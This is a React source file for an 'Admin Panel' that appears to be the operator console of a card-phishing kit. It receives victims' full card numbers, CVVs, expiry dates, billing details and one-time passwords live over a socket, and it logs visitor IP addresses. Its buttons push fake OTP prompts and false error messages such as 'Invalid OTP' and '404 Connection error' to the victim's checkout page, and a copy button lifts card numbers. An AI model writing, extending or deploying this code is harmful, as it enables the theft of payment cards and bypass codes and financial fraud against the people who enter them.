
import React, { useState, useEffect } from 'react';
import { MoreHorizontal, Check, X, AlertTriangle, Wifi, WifiOff, Copy } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { io, Socket } from 'socket.io-client';
import { useToast } from '@/hooks/use-toast';

interface PaymentData {
  id: string;
  cardNumber: string;
  cardName: string;
  cvv: string;
  expiry: string;
  billingDetails: {
    firstName: string;
    lastName: string;
    email: string;
    country: string;
    companyName: string;
  };
  planName: string;
  billing: string;
  amount: number;
  timestamp: string;
  status: 'pending' | 'approved' | 'rejected';
}

interface OtpData {
  paymentId: string;
  otp: string;
  timestamp: string;
}

interface VisitorData {
  id: string;
  ipAddress: string;
  timestamp: string;
  userAgent: string;
}

const Admin = () => {
  const [socket, setSocket] = useState<Socket | null>(null);
  const [isConnected, setIsConnected] = useState(false);
  const [payments, setPayments] = useState<PaymentData[]>([]);
  const [otps, setOtps] = useState<OtpData[]>([]);
  const [activeDropdown, setActiveDropdown] = useState<string | null>(null);
  const [liveVisitors, setLiveVisitors] = useState<VisitorData[]>([]);
  const { toast } = useToast();

  useEffect(() => {
    try {
      // Connect to WebSocket server with proper environment handling
      const socketUrl = process.env.NODE_ENV === 'production' 
        ? window.location.origin
        : 'http://localhost:3001';
      
      const newSocket = io(socketUrl, {
        timeout: 10000,
        reconnection: true,
        reconnectionAttempts: 5,
        reconnectionDelay: 2000,
        transports: ['websocket', 'polling']
      });
      setSocket(newSocket);

      newSocket.on('connect', () => {
        setIsConnected(true);
        console.log('Connected to WebSocket server');
      });

      newSocket.on('disconnect', (reason) => {
        setIsConnected(false);
        console.log('Disconnected from WebSocket server:', reason);
      });

      newSocket.on('connect_error', (error) => {
        setIsConnected(false);
        console.error('WebSocket connection error:', error);
      });

      newSocket.on('reconnect', (attemptNumber) => {
        setIsConnected(true);
        console.log('Reconnected to WebSocket server after', attemptNumber, 'attempts');
      });

      newSocket.on('reconnect_error', (error) => {
        console.error('WebSocket reconnection error:', error);
      });

      // Listen for new payment data with error handling
      newSocket.on('payment-received', (data: Omit<PaymentData, 'id' | 'status'>) => {
        try {
          if (!data || !data.cardNumber || !data.cardName) {
            console.error('Invalid payment data received:', data);
            return;
          }
          
          const newPayment: PaymentData = {
            ...data,
            id: Date.now().toString() + Math.random().toString(36).substr(2, 9),
            status: 'pending'
          };
          setPayments(prev => [newPayment, ...prev]);
        } catch (error) {
          console.error('Error processing payment data:', error);
        }
      });

      // Listen for OTP submissions with error handling
      newSocket.on('otp-received', (data: { otp: string }) => {
        try {
          if (!data || !data.otp) {
            console.error('Invalid OTP data received:', data);
            return;
          }
          
          const latestPayment = payments[0];
          if (latestPayment) {
            const newOtp: OtpData = {
              paymentId: latestPayment.id,
              otp: data.otp,
              timestamp: new Date().toISOString()
            };
            setOtps(prev => [newOtp, ...prev]);
          }
        } catch (error) {
          console.error('Error processing OTP data:', error);
        }
      });

      // Listen for visitor join/leave events
      newSocket.on('visitor-joined', (data: VisitorData) => {
        try {
          if (!data || !data.ipAddress) {
            console.error('Invalid visitor data received:', data);
            return;
          }
          
          setLiveVisitors(prev => {
            // Check if visitor already exists
            const existingIndex = prev.findIndex(v => v.ipAddress === data.ipAddress);
            if (existingIndex !== -1) {
              // Update existing visitor
              const updated = [...prev];
              updated[existingIndex] = data;
              return updated;
            } else {
              // Add new visitor
              return [data, ...prev];
            }
          });
        } catch (error) {
          console.error('Error processing visitor data:', error);
        }
      });

      newSocket.on('visitor-left', (data: { id: string; ipAddress: string }) => {
        try {
          if (!data || !data.ipAddress) {
            console.error('Invalid visitor leave data received:', data);
            return;
          }
          
          setLiveVisitors(prev => prev.filter(visitor => visitor.ipAddress !== data.ipAddress));
        } catch (error) {
          console.error('Error processing visitor leave data:', error);
        }
      });

      return () => {
        try {
          newSocket.disconnect();
        } catch (error) {
          console.error('Error disconnecting socket:', error);
        }
      };
    } catch (error) {
      console.error('Error initializing WebSocket connection:', error);
      setIsConnected(false);
    }
  }, []);

  const handleAction = (paymentId: string, action: string) => {
    try {
      if (!socket) {
        console.error('Socket not connected');
        toast({
          title: "Connection Error",
          description: "Connection lost. Please refresh the page.",
          variant: "destructive",
        });
        return;
      }

      if (!isConnected) {
        console.error('Socket not connected');
        toast({
          title: "Connection Error",
          description: "Not connected to server. Please wait for reconnection.",
          variant: "destructive",
        });
        return;
      }

      switch (action) {
        case 'show-otp':
          socket.emit('show-otp');
          break;
        case 'invalid-otp':
          socket.emit('reject-payment', { reason: 'Invalid OTP' });
          updatePaymentStatus(paymentId, 'rejected');
          break;
        case 'invalid-card':
          socket.emit('reject-payment', { reason: 'Invalid card details' });
          updatePaymentStatus(paymentId, 'rejected');
          break;
        case 'incorrect-details':
          socket.emit('reject-payment', { reason: 'Incorrect card details' });
          updatePaymentStatus(paymentId, 'rejected');
          break;
        case 'connection-error':
          socket.emit('reject-payment', { reason: '404 Connection error' });
          updatePaymentStatus(paymentId, 'rejected');
          break;
        case 'successful':
          socket.emit('approve-payment');
          updatePaymentStatus(paymentId, 'approved');
          break;
        default:
          console.error('Unknown action:', action);
          return;
      }
      setActiveDropdown(null);
    } catch (error) {
      console.error('Error handling action:', error);
      toast({
        title: "Error",
        description: "An error occurred. Please try again.",
        variant: "destructive",
      });
    }
  };

  const updatePaymentStatus = (paymentId: string, status: 'approved' | 'rejected') => {
    setPayments(prev => prev.map(payment => 
      payment.id === paymentId ? { ...payment, status } : payment
    ));
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text).then(() => {
      toast({
        title: "Copied!",
        description: "Card number copied to clipboard",
      });
    }).catch((error) => {
      console.error('Error copying to clipboard:', error);
      toast({
        title: "Error",
        description: "Failed to copy to clipboard",
        variant: "destructive",
      });
    });
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'approved': return 'text-green-400';
      case 'rejected': return 'text-red-400';
      default: return 'text-yellow-400';
    }
  };

  const getStatusIcon = (status: string) => {
    switch (status) {
      case 'approved': return <Check className="h-4 w-4" />;
      case 'rejected': return <X className="h-4 w-4" />;
      default: return <AlertTriangle className="h-4 w-4" />;
    }
  };

  return (
    <div className="min-h-screen bg-black text-white p-6">
      <div className="max-w-7xl mx-auto">
        {/* Header with Connection Status */}
        <div className="flex items-center justify-between mb-8">
          <h1 className="text-3xl font-bold">Admin Panel</h1>
          <div className="flex items-center gap-4">
            {/* Connection Status */}
            <div className="flex items-center gap-2 bg-gray-800 px-3 py-2 rounded-lg">
              {isConnected ? (
                <>
                  <Wifi className="h-5 w-5 text-green-400" />
                  <span className="text-green-400 text-sm font-medium">Connected</span>
                </>
              ) : (
                <>
                  <WifiOff className="h-5 w-5 text-red-400" />
                  <span className="text-red-400 text-sm font-medium">Disconnected</span>
                </>
              )}
            </div>
          </div>
        </div>

        {/* Live Visitors Section */}
        <div className="bg-gray-900 rounded-lg overflow-hidden mb-8">
          <div className="p-6 border-b border-gray-700">
            <h2 className="text-xl font-semibold">Live Visitors</h2>
            <p className="text-gray-400 mt-1">Real-time website visitors ({liveVisitors.length} online)</p>
          </div>
          
          <div className="overflow-x-auto">
            <table className="w-full">
              <thead className="bg-gray-800">
                <tr>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Timestamp
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    IP Address
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    User Agent
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Status
                  </th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-700">
                {liveVisitors.length === 0 ? (
                  <tr>
                    <td colSpan={4} className="px-6 py-8 text-center text-gray-400">
                      No live visitors at the moment
                    </td>
                  </tr>
                ) : (
                  liveVisitors.map((visitor) => (
                    <tr key={visitor.id} className="hover:bg-gray-800">
                      <td className="px-6 py-4 whitespace-nowrap text-sm">
                        {new Date(visitor.timestamp).toLocaleString()}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="bg-red-600 text-black px-3 py-1 rounded font-bold text-sm">
                          {visitor.ipAddress}
                        </div>
                      </td>
                      <td className="px-6 py-4 text-sm text-gray-300">
                        <div className="max-w-xs truncate" title={visitor.userAgent}>
                          {visitor.userAgent}
                        </div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-green-100 text-green-800">
                          <div className="w-2 h-2 bg-green-500 rounded-full mr-1.5 animate-pulse"></div>
                          Online
                        </span>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>

        {/* Payment Data Table */}
        <div className="bg-gray-900 rounded-lg overflow-hidden mb-8">
          <div className="p-6 border-b border-gray-700">
            <h2 className="text-xl font-semibold">Payment Transactions</h2>
            <p className="text-gray-400 mt-1">Real-time payment data from checkout</p>
          </div>
          
          <div className="overflow-x-auto">
            <table className="w-full">
              <thead className="bg-gray-800">
                <tr>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Timestamp
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Customer
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Card Number
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Holder Name
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    CVV
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Expiry
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Amount
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Status
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Actions
                  </th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-700">
                {payments.length === 0 ? (
                  <tr>
                    <td colSpan={9} className="px-6 py-8 text-center text-gray-400">
                      No payment data received yet. Waiting for transactions...
                    </td>
                  </tr>
                ) : (
                  payments.map((payment) => (
                    <tr key={payment.id} className="hover:bg-gray-800">
                      <td className="px-6 py-4 whitespace-nowrap text-sm">
                        {new Date(payment.timestamp).toLocaleString()}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="text-sm font-medium">{payment.billingDetails.firstName} {payment.billingDetails.lastName}</div>
                        <div className="text-sm text-gray-400">{payment.billingDetails.email}</div>
                        <div className="text-xs text-gray-500">{payment.billingDetails.country}</div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm font-mono">
                        <div className="flex items-center gap-2">
                          <span className="text-green-400">{payment.cardNumber}</span>
                          <Button
                            variant="ghost"
                            size="sm"
                            onClick={() => copyToClipboard(payment.cardNumber)}
                            className="h-6 w-6 p-0 text-gray-400 hover:text-white"
                          >
                            <Copy className="h-3 w-3" />
                          </Button>
                        </div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm">
                        {payment.cardName}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm font-mono">
                        {payment.cvv}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm">
                        {payment.expiry}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm font-medium">
                        ₹{payment.amount.toLocaleString()}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <span className={`flex items-center gap-2 text-sm font-medium ${getStatusColor(payment.status)}`}>
                          {getStatusIcon(payment.status)}
                          {payment.status.charAt(0).toUpperCase() + payment.status.slice(1)}
                        </span>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-right text-sm font-medium">
                        <div className="relative">
                          <Button
                            variant="ghost"
                            size="sm"
                            onClick={() => setActiveDropdown(activeDropdown === payment.id ? null : payment.id)}
                            className="text-white hover:bg-gray-700"
                          >
                            <MoreHorizontal className="h-4 w-4" />
                          </Button>
                          
                          {activeDropdown === payment.id && (
                            <div className="absolute right-0 mt-2 w-48 bg-gray-800 rounded-md shadow-lg z-10 border border-gray-700">
                              <div className="py-1">
                                <button
                                  onClick={() => handleAction(payment.id, 'show-otp')}
                                  className="block w-full text-left px-4 py-2 text-sm text-white hover:bg-gray-700"
                                >
                                  Show OTP
                                </button>
                                <button
                                  onClick={() => handleAction(payment.id, 'invalid-otp')}
                                  className="block w-full text-left px-4 py-2 text-sm text-white hover:bg-gray-700"
                                >
                                  Invalid OTP
                                </button>
                                <button
                                  onClick={() => handleAction(payment.id, 'invalid-card')}
                                  className="block w-full text-left px-4 py-2 text-sm text-white hover:bg-gray-700"
                                >
                                  Invalid Card
                                </button>
                                <button
                                  onClick={() => handleAction(payment.id, 'incorrect-details')}
                                  className="block w-full text-left px-4 py-2 text-sm text-white hover:bg-gray-700"
                                >
                                  Incorrect Card Details
                                </button>
                                <button
                                  onClick={() => handleAction(payment.id, 'connection-error')}
                                  className="block w-full text-left px-4 py-2 text-sm text-white hover:bg-gray-700"
                                >
                                  404 Connection Error
                                </button>
                                <button
                                  onClick={() => handleAction(payment.id, 'successful')}
                                  className="block w-full text-left px-4 py-2 text-sm text-green-400 hover:bg-gray-700"
                                >
                                  Successful
                                </button>
                              </div>
                            </div>
                          )}
                        </div>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>

        {/* OTP Data Table */}
        {otps.length > 0 && (
          <div className="bg-gray-900 rounded-lg overflow-hidden">
            <div className="p-6 border-b border-gray-700">
              <h2 className="text-xl font-semibold">OTP Submissions</h2>
              <p className="text-gray-400 mt-1">OTPs received from customers</p>
            </div>
            
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-gray-800">
                  <tr>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                      Timestamp
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                      Payment ID
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                      OTP
                    </th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-700">
                  {otps.map((otp, index) => (
                    <tr key={index} className="hover:bg-gray-800">
                      <td className="px-6 py-4 whitespace-nowrap text-sm">
                        {new Date(otp.timestamp).toLocaleString()}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm font-mono">
                        {otp.paymentId}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm font-mono text-yellow-400">
                        {otp.otp}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default Admin;
